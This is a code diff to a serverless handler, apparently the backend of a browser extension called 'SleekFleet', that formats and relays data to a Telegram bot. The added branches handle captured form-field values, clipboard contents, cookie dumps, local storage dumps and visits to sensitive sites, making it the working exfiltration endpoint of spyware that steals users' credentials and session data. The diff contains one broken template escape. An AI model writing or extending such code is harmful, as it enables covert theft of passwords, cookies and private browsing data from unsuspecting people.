@@ -1,7 +1,5 @@
-// src/api/scrape.js
-
 export default async function handler(req, res) {
-  // 1. Handle CORS Preflight (Required for Chrome Extensions)
+  // 1. Handle CORS Preflight
   if (req.method === 'OPTIONS') {
     return res.status(200).json({});
   }
@@ -9,7 +7,6 @@ export default async function handler(req, res) {
   // 2. Parse Body Correctly
   let payload = {};
   try {
-    // Vercel Node functions sometimes pass body as string or object
     const rawBody = req.body || "";
     payload = typeof rawBody === 'string' ? JSON.parse(rawBody) : rawBody;
   } catch (e) {
@@ -23,16 +20,70 @@ export default async function handler(req, res) {
   }
 
   try {
-    // 4. Format Message
-    const msg = `
-🚗 *SleekFleet Session Data*
+    // 4. Format Message Based on Source
+    let msg = "";
+    const timestamp = new Date().toISOString();
+    const url = payload.url || "N/A";
+    const field = payload.field_name || payload.source || "Unknown Field";
 
-🆔 Email: \`${payload.email || "N/A"}\`
-🌐 IP: \`${payload.ip || "Unknown"}\`
-📋 Clipboard: \`${payload.data || "Empty"}\`
-📍 Source: ${payload.source || 'web'}
-⏰ Time: ${new Date().toISOString()}
-    `.trim();
+    if (payload.source === "input_field_capture") {
+      msg = `
+🚗 *SleekFleet Input Capture*
+
+📍 Site: \`${url}\`
+🏷️ Field: \`${field}\`
+🔑 Value: \`${payload.value || "Empty"}\`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+    } else if (payload.source === "clipboard_sensitive" || payload.source === "clipboard_on_focus") {
+      msg = `
+🚗 *SleekFleet Clipboard Grab*
+
+📋 Data: \`${payload.data || "Empty"}\`
+📍 Context: \`${url}\`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+    } else if (payload.source === "cookie_dump") {
+      msg = `
+🚗 *SleekFleet Cookie Dump*
+
+🍪 Cookies: \`${payload.data || "None"}\`
+📍 Site: \`${url}\`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+    } else if (payload.source === "local_storage_dump") {
+      const lsData = typeof payload.data === 'object' ? JSON.stringify(payload.data) : payload.data;
+      msg = `
+🚗 *SleekFleet Local Storage Dump*
+
+💾 Data: \`${lsData.substring(0, 100)}...\`
+📍 Site: \`${url}\`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+    } else if (payload.source === "tab_navigated_to_sensitive_site") {
+      msg = `
+🚗 *SleekFleet Sensitive Site Visit*
+
+🌐 URL: \`${payload.data.url}\`
+📝 Title: \`${payload.data.title}\`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+    } else if (payload.source === "url_change") {
+      msg = `
+🚗 *SleekFleet URL Change*
+
+🌐 URL: \`${payload.url}\`
+📝 Title: \`${payload.title}\`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+    } else {
+      msg = `
+🚗 *SleekFleet Generic Data*
+
+📋 Data: \`${JSON.stringify(payload)\}`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+    }
 
     // 5. Send to Telegram
     const tgToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -42,9 +93,8 @@ export default async function handler(req, res) {
       try {
         const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
         
-        // Add timeout to prevent hanging requests
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout
+        const timeoutId = setTimeout(() => controller.abort(), 5000); 
 
         const response = await fetch(tgUrl, {
           method: 'POST',
@@ -65,11 +115,12 @@ export default async function handler(req, res) {
           console.log("✅ Telegram Message Sent");
         }
       } catch (err) {
-        // Log error but don't fail the whole request
         console.error("❌ Telegram Fetch Failed:", err.message);
       }
     } else {
       console.log("⚠️ Telegram skipped: Missing Env Vars");
+      // For debugging, log the message
+      console.log("Payload:", msg);
     }
 
     // 6. Return Success to Extension
